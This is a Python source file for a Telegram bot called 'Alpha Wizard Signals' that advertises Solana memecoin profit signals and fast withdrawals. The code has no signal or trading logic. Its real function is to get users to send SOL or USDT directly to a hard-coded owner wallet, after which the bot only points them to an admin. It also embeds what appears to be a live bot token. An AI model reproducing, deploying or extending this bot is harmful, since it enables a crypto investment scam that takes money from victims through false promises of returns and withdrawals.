import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)

BOT_TOKEN = "8013194385:AAHRFcTr2T5kObSxBPQ-tdNw6AzNOGsMes0"
OWNER_WALLET = "H8XMEhRXuVvoT24uBpZ6dT6i1QHDuogvgVDC8UFafVYn"
ADMIN_USERNAME = "@YourTelegramUsername"
MIN_SOL = 1.5
MIN_USDT = 100

funded_users = set()
logging.basicConfig(level=logging.INFO)

def main_menu_keyboard(user_id):
    funded = user_id in funded_users
    lock = "" if funded else "🔒 "
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Fund Wallet", callback_data="fund")],
        [
            InlineKeyboardButton(f"{lock}2x Token 🎯", callback_data="2x"),
            InlineKeyboardButton(f"{lock}4x Token 🎯", callback_data="4x"),
        ],
        [
            InlineKeyboardButton(f"{lock}10x Token 🎯", callback_data="10x"),
            InlineKeyboardButton(f"{lock}Buy a Token", callback_data="buy"),
        ],
        [
            InlineKeyboardButton(f"{lock}Withdraw", callback_data="withdraw"),
            InlineKeyboardButton("ℹ️ About", callback_data="about"),
        ],
        [InlineKeyboardButton("🆘 Help", callback_data="help")],
    ])

def back_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="menu")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome = (
        f"👋 Welcome, {user.first_name}!\n\n"
        "⚡ *Alpha Wizard Signals* — Your edge in the Solana memecoin market.\n\n"
        "We scan the chain in real-time, filter out rugs and honeypots, "
        "and deliver high-conviction token calls before the crowd catches on.\n\n"
        "🔥 *What you get:*\n"
        "• Early 2x, 4x, and 10x token recommendations\n"
        "• Rug and honeypot filters\n"
        "• Direct buy guidance on promising plays\n"
        "• Fast withdraw support\n\n"
        f"💳 *To unlock the bot, fund your wallet with a minimum of:*\n"
        f"  • `{MIN_SOL} SOL`  or  `{MIN_USDT} USDT`\n\n"
        "Hit *Fund Wallet* below to get started. 🚀"
    )
    await update.message.reply_text(
        welcome,
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(user.id)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "menu":
        await query.edit_message_text(
            "🏠 *Main Menu* — Choose an option below:",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(user_id)
        )

    elif data == "fund":
        text = (
            "💰 *Fund Your Wallet*\n\n"
            f"Send a minimum of *{MIN_SOL} SOL* or *{MIN_USDT} USDT* to the address below:\n\n"
            f"`{OWNER_WALLET}`\n\n"
            "⚠️ *Important:*\n"
            "• Send only on the *Solana* network\n"
            "• After sending, tap the button below and paste your *transaction hash (TxID)*\n"
            "• Access is activated once payment is confirmed ✅"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ I Have Sent Payment", callback_data="submit_tx")],
            [InlineKeyboardButton("⬅️ Back", callback_data="menu")],
        ])
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=keyboard)

    elif data == "submit_tx":
        await query.edit_message_text(
            "📋 *Paste your Transaction Hash (TxID) below:*\n\n"
            "Example: `5Hx3...abc9`\n\n"
            "We will verify and activate your access shortly.",
            parse_mode="Markdown",
            reply_markup=back_keyboard()
        )
        context.user_data["waiting_tx"] = True

    elif data in ["2x", "4x", "10x", "buy"]:
        if user_id not in funded_users:
            await query.edit_message_text(
                "🔒 *Access Locked*\n\n"
                "You need to fund your wallet first to unlock signals.\n\n"
                "Tap *Fund Wallet* to get started.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💰 Fund Wallet", callback_data="fund")],
                    [InlineKeyboardButton("⬅️ Back", callback_data="menu")],
                ])
            )
        else:
            label = {"2x": "2x", "4x": "4x", "10x": "10x", "buy": "Buy"}.get(data)
            text = (
                f"🎯 *{label} Token Signals*\n\n"
                "New signal recommendations are posted regularly.\n\n"
                f"📩 Contact the admin for the latest call: {ADMIN_USERNAME}\n\n"
                "Stay sharp. The next gem drops soon. 💎"
            )
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard())

    elif data == "withdraw":
        if user_id not in funded_users:
            await query.edit_message_text(
                "🔒 *Access Locked*\n\nFund your wallet first to access withdraw.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💰 Fund Wallet", callback_data="fund")],
                    [InlineKeyboardButton("⬅️ Back", callback_data="menu")],
                ])
            )
        else:
            text = (
                "💸 *Withdraw Request*\n\n"
                f"To process a withdrawal, contact the admin directly: {ADMIN_USERNAME}\n\n"
                "Please provide:\n"
                "• Your wallet address\n"
                "• Amount to withdraw\n\n"
                "All withdrawals are processed within 24 hours. ✅"
            )
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard())

    elif data == "about":
        text = (
            "⚡ *About Alpha Wizard Signals*\n\n"
            "Alpha Wizard Signals is a professional Solana memecoin intelligence bot.\n\n"
            "We specialize in:\n"
            "• Early-stage token discovery\n"
            "• Rug and honeypot detection\n"
            "• High-conviction 2x to 10x+ calls\n\n"
            "Built for traders who want to move *before* the crowd.\n\n"
            f"📩 Admin: {ADMIN_USERNAME}"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard())

    elif data == "help":
        text = (
            "🆘 *Help & Support*\n\n"
            "Having issues? We've got you.\n\n"
            "• *Funding issues* — send your TxID to admin\n"
            "• *Access not unlocked* — allow up to 30 mins for confirmation\n"
            "• *Signal questions* — DM admin directly\n"
            "• *Withdrawals* — contact admin with your wallet + amount\n\n"
            f"📩 Admin: {ADMIN_USERNAME}\n\n"
            "We respond fast. 🚀"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if context.user_data.get("waiting_tx"):
        tx_hash = update.message.text.strip()
        context.user_data["waiting_tx"] = False
        await context.bot.send_message(
            chat_id=ADMIN_USERNAME,
            text=(
                f"🔔 *New Payment Submission*\n\n"
                f"User: {user.full_name} (@{user.username})\n"
                f"ID: `{user.id}`\n"
                f"TxID: `{tx_hash}`\n\n"
                f"Use /approve {user.id} to activate their access."
            ),
            parse_mode="Markdown"
        )
        await update.message.reply_text(
            "✅ *Payment submitted!*\n\n"
            "Your transaction has been sent to the admin for verification.\n"
            "Access will be activated within *30 minutes*.\n\n"
            f"Need faster support? DM {ADMIN_USERNAME}",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(user.id)
        )
    else:
        await update.message.reply_text(
            "Use the menu below to navigate. 👇",
            reply_markup=main_menu_keyboard(user.id)
        )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    try:
        target_id = int(context.args[0])
        funded_users.add(target_id)
        await update.message.reply_text(f"✅ User {target_id} approved and unlocked.")
        await context.bot.send_message(
            chat_id=target_id,
            text=(
                "🎉 *Payment Confirmed!*\n\n"
                "Your wallet has been funded and your access is now *fully unlocked*.\n\n"
                "Start exploring your signals below. Let's catch some gems! 💎🚀"
            ),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(target_id)
        )
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("Alpha Wizard Signals bot is running...")
    app.run_polling()
